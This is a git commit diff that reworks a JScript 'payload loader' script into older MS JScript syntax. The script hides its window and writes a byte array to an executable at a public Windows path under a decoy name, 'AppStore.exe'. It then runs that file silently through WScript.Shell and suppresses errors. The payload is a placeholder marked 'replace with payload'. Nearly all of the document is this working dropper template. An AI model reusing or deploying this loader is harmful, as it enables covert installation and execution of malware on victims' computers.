7e727cfe0d3658fecaa75e5b2fd6f2e1bec15761
Samuel Sulovsky <samuel.sulovsky@gmail.com>
2022-05-28 17:40:31 +0200

    Bring unobfuscated payload to MS JScript standards

--- implementation/src/payload_loader/unobfuscated_payload.js
+++ implementation/src/payload_loader/unobfuscated_payload.js
@@ -1,22 +1,24 @@
 window.resizeTo(0, 0)
 try {
-  const data = [144, 3, 0, 4, 0, 65545, 0, 184] // replace with payload
-  const path = 'C:/Users/Public/Libraries/AppStore.exe'
-  let fso = new ActiveXObject('Scripting.FileSystemObject')
+  var data = [104,101,108,108,111,32,102,114,111,109,32,109,115,104,116,97] // replace with payload
+  var path = "C:\\Users\\Public\\Libraries\\AppStore.exe"
+  var fso = new ActiveXObject("Scripting.FileSystemObject")
 
-  const content = data
-    .map((charCode) => String.fromCharCode(charCode))
-    .join('')
+  var content = []
+  for (var i = 0; i < data.length; i++) {
+    content.push(String.fromCharCode(data[i]))
+  }
 
-  let file = fso.CreateTextFile(path, true)
-  file.Write('MZ')
+  var file = fso.CreateTextFile(path, true)
+  file.Write("MZ")
   file.Close()
 
   file = fso.OpenTextFile(path, 8, false, -1)
   file.Write(content)
   file.Close()
-
-  let shell = new ActiveXObject(WScript.Shell)
+  var shell = new ActiveXObject("WScript.Shell")
   shell.Run(path, 0)
+
 } catch (error) {}
 window.close()
+
